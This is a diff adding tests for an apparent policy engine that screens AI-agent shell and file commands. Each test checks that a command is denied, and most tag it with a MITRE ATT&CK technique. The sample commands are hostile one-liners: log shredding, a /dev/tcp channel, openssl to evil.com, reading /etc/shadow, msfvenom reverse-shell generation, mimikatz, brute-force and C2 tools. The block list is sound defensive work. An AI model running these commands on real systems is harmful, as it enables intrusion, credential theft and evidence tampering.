@@ -711,4 +711,320 @@ describe("PolicyEngine — hardened defaults", () => {
     assert.equal(r.verdict, "ask");
     assert.equal(r.matched_rule, null);
   });
+
+  // -- MITRE ATT&CK tagging verification ---------------------------------
+
+  it("includes mitre_id on matched deny rules", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "rm -rf /tmp/stuff"));
+    assert.equal(r.matched_rule?.mitre_id, "T1485");
+  });
+
+  it("includes mitre_id on matched ask rules", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "git push origin main"));
+    assert.equal(r.matched_rule?.mitre_id, "T1567");
+  });
+
+  // -- Anti-forensics / evidence tampering --------------------------------
+
+  it("denies history clearing", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "history -c"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1070.003");
+  });
+
+  it("denies HISTFILE unsetting", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "unset HISTFILE"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies shred", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "shred -zu /var/log/auth.log"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1070.004");
+  });
+
+  it("denies journal log rotation", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "journalctl --rotate --vacuum-time=1s"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- LOLBins / network channels -----------------------------------------
+
+  it("denies /dev/tcp redirect", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "exec 3<>/dev/tcp/10.0.0.1/4444"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies openssl s_client data channel", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "openssl s_client -connect evil.com:443"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies chisel tunnel", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "chisel client 10.0.0.1:8080 R:socks"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies proxychains", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "proxychains nmap 192.168.1.0/24"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Credential file access ---------------------------------------------
+
+  it("denies cat /etc/shadow", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "cat /etc/shadow"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1003.008");
+  });
+
+  it("denies Read /etc/shadow", () => {
+    const r = defaultEngine().evaluate(makeReq("Read", "/etc/shadow"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Reconnaissance / scanning ------------------------------------------
+
+  it("denies nmap", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "nmap -sV 192.168.1.0/24"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1046");
+  });
+
+  it("denies masscan", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "masscan 10.0.0.0/8 -p80,443"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies nikto", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "nikto -h http://target.com"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies gobuster", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "gobuster dir -u http://target.com -w wordlist.txt"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies ffuf", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "ffuf -u http://target.com/FUZZ -w wordlist.txt"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies recon-ng", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "recon-ng -w workspace"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies enum4linux", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "enum4linux -a 192.168.1.10"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies dnsrecon", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "dnsrecon -d target.com"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies wpscan", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "wpscan --url http://target.com"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Exploitation frameworks --------------------------------------------
+
+  it("denies msfconsole", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "msfconsole -q -x 'use exploit/multi/handler'"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1203");
+  });
+
+  it("denies msfvenom", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies sqlmap", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "sqlmap -u 'http://target.com/?id=1' --dbs"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1190");
+  });
+
+  it("denies searchsploit", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "searchsploit apache 2.4"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies beef-xss", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "beef-xss --port 3000"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Brute force / credential attacks -----------------------------------
+
+  it("denies hydra", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "hydra -l admin -P passwords.txt ssh://192.168.1.10"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1110.001");
+  });
+
+  it("denies john the ripper", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "john --wordlist=rockyou.txt hashes.txt"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1110.002");
+  });
+
+  it("denies hashcat", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "hashcat -m 1000 ntlm.hash rockyou.txt"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies medusa", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "medusa -h 192.168.1.10 -u admin -P pass.txt -M ssh"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies cewl wordlist generator", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "cewl http://target.com -w wordlist.txt"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Credential dumping / post-exploitation -----------------------------
+
+  it("denies mimikatz", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "mimikatz.exe sekurlsa::logonPasswords"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1003.001");
+  });
+
+  it("denies impacket secretsdump", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "secretsdump.py admin:password@192.168.1.10"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies crackmapexec", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "crackmapexec smb 192.168.1.0/24 -u admin -p pass"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies lazagne", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "lazagne all"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- C2 frameworks ------------------------------------------------------
+
+  it("denies cobalt strike", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "cobaltstrike teamserver 10.0.0.1 password"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1071.001");
+  });
+
+  it("denies sliver C2", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "sliver-server"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies empire", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "empire --rest --restport 1337"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies havoc C2", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "havoc server --profile profile.yaotl"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Network poisoning / MITM -------------------------------------------
+
+  it("denies responder", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "responder -I eth0 -wrf"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1557.001");
+  });
+
+  it("denies ettercap", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "ettercap -T -q -M arp:remote //192.168.1.1//"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies bettercap", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "bettercap -iface eth0"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- AD / lateral movement ----------------------------------------------
+
+  it("denies bloodhound", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "bloodhound-python -d domain.local -u user -p pass"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1087.002");
+  });
+
+  it("denies kerbrute", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "kerbrute userenum users.txt -d domain.local"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies evil-winrm", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "evil-winrm -i 192.168.1.10 -u admin -p password"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Privilege escalation enumeration -----------------------------------
+
+  it("denies linpeas", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "./linpeas.sh"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1082");
+  });
+
+  it("denies linux-exploit-suggester", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "linux-exploit-suggester.sh"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies pspy", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "./pspy64"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Wireless / packet attacks ------------------------------------------
+
+  it("denies aircrack-ng", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "aircrack-ng capture.cap -w wordlist.txt"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1040");
+  });
+
+  it("denies hping3", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "hping3 -S 192.168.1.1 -p 80 --flood"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  // -- Payload generation / evasion ---------------------------------------
+
+  it("denies veil-evasion", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "veil-evasion"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1587.001");
+  });
+
+  it("denies UPX packer", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "upx --best payload.elf"));
+    assert.equal(r.verdict, "deny");
+    assert.equal(r.matched_rule?.mitre_id, "T1027.002");
+  });
+
+  // -- Binary exploitation ------------------------------------------------
+
+  it("denies ROPgadget", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "ROPgadget --binary vuln_app"));
+    assert.equal(r.verdict, "deny");
+  });
+
+  it("denies pwntools", () => {
+    const r = defaultEngine().evaluate(makeReq("Bash", "python3 -c 'from pwntools import *'"));
+    assert.equal(r.verdict, "deny");
+  });
 });
